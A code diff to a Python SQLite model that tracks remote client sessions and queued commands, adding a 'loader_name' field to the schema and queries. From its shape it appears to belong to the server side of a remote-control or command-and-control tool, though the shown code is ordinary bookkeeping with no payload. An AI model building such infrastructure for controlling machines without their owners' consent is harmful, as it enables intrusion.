@@ -30,13 +30,14 @@ class Command:
 class Client:
     """This class represents a client."""
 
-    def __init__(self, client_id, username, hostname, remote_ip, path, last_online):
+    def __init__(self, client_id, username, hostname, remote_ip, path, last_online, loader_name):
         self.id = client_id
         self.username = username
         self.hostname = hostname
         self.remote_ip = remote_ip
         self.path = path
         self.last_online = last_online
+        self.loader_name = loader_name
 
 
 class ClientModel:
@@ -56,7 +57,8 @@ class ClientModel:
                              "hostname text, "
                              "remote_ip text, "
                              "path text, "
-                             "last_online text)")
+                             "last_online text, "
+                             "loader_name text)")
         self._cursor.execute("CREATE TABLE commands("
                              "client_id string, "
                              "command text, "
@@ -65,11 +67,14 @@ class ClientModel:
         self._database.commit()
 
     def add_client(self, client):
-        """Adds a client session."""
+        """Adds a client session.
+
+        :type client: Client
+        """
         with self._lock:
-            self._cursor.execute("INSERT INTO clients VALUES (?,?,?,?,?,?)",
-                                 (client.id, client.username, client.hostname,
-                                  client.remote_ip, client.path, client.last_online))
+            self._cursor.execute("INSERT INTO clients VALUES (?,?,?,?,?,?,?)",
+                                 (client.id, client.username, client.hostname, client.remote_ip,
+                                  client.path, client.last_online, client.loader_name))
             self._database.commit()
 
     def get_client(self, client_id):
@@ -78,7 +83,10 @@ class ClientModel:
             response = self._cursor.execute("SELECT * FROM clients WHERE client_id = ?",
                                             (client_id,)).fetchone()
             if response:
-                return Client(response[0], response[1], response[2], response[3], response[4], response[5])
+                return Client(
+                    response[0], response[1], response[2], response[3],
+                    response[4], response[5], response[6]
+                )
 
     def remove_client(self, client_id):
         """Removes the client session."""
@@ -95,7 +103,7 @@ class ClientModel:
             response = self._cursor.execute("SELECT * FROM clients").fetchall()
 
             for row in response:
-                clients.append(Client(row[0], row[1], row[2], row[3], row[4], row[5]))
+                clients.append(Client(row[0], row[1], row[2], row[3], row[4], row[5], row[6]))
         return clients
 
     def send_command(self, command):
